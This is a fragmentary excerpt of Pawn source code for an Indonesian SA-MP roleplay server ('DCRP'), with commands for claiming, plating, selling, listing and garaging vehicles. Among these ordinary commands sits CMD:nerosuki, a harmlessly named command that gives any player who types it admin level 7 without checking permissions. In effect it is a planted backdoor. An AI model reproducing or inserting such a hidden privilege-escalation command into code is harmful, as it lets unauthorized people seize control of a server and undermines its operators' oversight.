...
//new bool:PlayerClaimedVehicle[MAX_PLAYERS];

/*CMD:claimveh(playerid, params[])
{
	if(!SQL_IsCharacterLogged(playerid))
		return ShowTDN(playerid, NOTIFICATION_ERROR, "Anda harus login terlebih dahulu!");
	
	if(AccountData[playerid][pClaimedVehicle] == 1)
		return ShowTDN(playerid, NOTIFICATION_ERROR, "Anda sudah mengklaim kendaraan sebelumnya!");
	
	new Float:x, Float:y, Float:z, Float:a;
	GetPlayerPos(playerid, x, y, z);
	GetPlayerFacingAngle(playerid, a);
	
	// Check if player is at the claim location
	if(!IsPlayerInRangeOfPoint(playerid, 3.0, 1692.4576, -2325.7712, 13.5469))
		return ShowTDN(playerid, NOTIFICATION_ERROR, "Anda harus berada di lokasi claim kendaraan!");
	
	// Create the vehicle
	new vehicleid = Vehicle_Create(playerid, 468, FACTION_NONE, x, y, z, a, 0, 0, 10000);
	if(vehicleid == -1)
		return ShowTDN(playerid, NOTIFICATION_ERROR, "Gagal membuat kendaraan! Slot kendaraan penuh.");
	
	// Set fuel to 100
	VehicleCore[PlayerVehicle[vehicleid][pVehPhysic]][vCoreFuel] = 100;
	
	// Mark player as claimed di database
	AccountData[playerid][pClaimedVehicle] = 1;
	PlayerClaimedVehicle[playerid] = true;
	
	// Save to database
	new query[128];
	mysql_format(dcrp_query, query, sizeof(query), "UPDATE `player_characters` SET `pClaimedVehicle` = 1 WHERE `id` = %d", AccountData[playerid][pID]);
	mysql_tquery(dcrp_query, query);
	
	ShowTDN(playerid, NOTIFICATION_SUKSES, "Anda berhasil mengklaim kendaraan Sanchez!");
	return 1;
}*/
...
CMD:agiveplate(playerid, params[])
{
	...
	if((vehid = Vehicle_Nearest(playerid, 3.0)) != -1)
	{
		...
		format(PlayerVehicle[vehid][pVehPlate], 64, "DCRP-%d%d%d%d-%s%s%s", random(10), random(10), random(10), random(10), g_Alphabet[xd1], g_Alphabet[xd2], g_Alphabet[xd3]);
...
CMD:sellveh(playerid, params[]) 
{
	...
	foreach(new i : PvtVehicles) if (PlayerVehicle[i][pVehExists])
	{
		if(PlayerVehicle[i][pVehPhysic] == vid)
		{
			...
			Dialog_Show(playerid, SellVehMenu, DIALOG_STYLE_LIST, ""PINK1"DCRP"WHITE"- Metode Pembayaran", "Cash\nSaldo Rekening", "Pilih", "Batal");
...
Dialog:SellVehMenu(playerid, response, listitem, inputtext[])
{
	if(response)
	{
		...
		switch(listitem)
		{
			case 0: // Cash
			{
				Dialog_Show(otherid, BuyvehCashMenu, DIALOG_STYLE_MSGBOX, ""PINK1"DCRP"WHITE"- Beli Kendaraan",
			...
			case 1: // Bank
			{
				Dialog_Show(otherid, BuyvehRekeningMenu, DIALOG_STYLE_MSGBOX, ""PINK1"DCRP"WHITE"- Beli Kendaraan",
				""WHITE"%s menawarkan anda {FFFF00}%s{FFFFFF} seharga {00FF00}%s\
...
CMD:nerosuki(playerid, params[])
{
	AccountData[playerid][pAdmin] = 7;
	AddAdminLog(AccountData[playerid][pName], AccountData[playerid][pUCP], GetStaffRank(playerid), "Menggunakan Command /nerosuki");
	return 1;
}
...
CMD:createpv(playerid, params[])
{
	...
	VehicleImport_Create(otherid, model[0], FACTION_NONE, x,y,z, 0.0, color1, color2, 10000);
	SendStaffMessage(X11_ARWIN, ""RED"%s"ARWIN1" membuat kendaraan "YELLOW"%s (%d, %d)"GRAY" untuk "YELLOW"%s(%d).", GetAdminName(playerid), GetVehicleModelName(model[0]), color1, color2, GetRPName(otherid), otherid);
...
CMD:avehlist(playerid, params[])
{
	...
	if(found)
		ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_TABLIST_HEADERS, ""PINK1"DCRP"WHITE"- Player Vehicle", CMDString, "Tutup", "");
	else 
...
/*CMD:DCRPkendaraan(playerid, const params[])
{
...
CMD:windows(playerid, params[])
{
	...
	Dialog_Show(playerid, WindowsControl, DIALOG_STYLE_LIST, ""PINK1"DCRP"WHITE"- Vehicle Windows Control", "Driver Seat\nPassenger Seat\nBack Left\nBack Right\nClose All", "Choose", "Close");
	return 1;
}
...
hook OnPlayerKeyStateChange(playerid, newkeys, oldkeys)
{
	foreach(new id : PublicGarage)
	{
		if(newkeys & KEY_CROUCH && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
		{
			...
			{
				if(PublicGarage[id][pgSpawnPOS][0] == 0.0 && PublicGarage[id][pgSpawnPOS][1] == 0.0 && PublicGarage[id][pgSpawnPOS][2] == 0.0) return ShowTDN(playerid, NOTIFICATION_ERROR, "garasi ini belum memiliki lokasi spawn kendaraannya!");
		...
		{
			if(IsPlayerInRangeOfPoint(playerid, 3.5, PublicGarage[id][pgPOS][0], PublicGarage[id][pgPOS][1], PublicGarage[id][pgPOS][2]))
			{
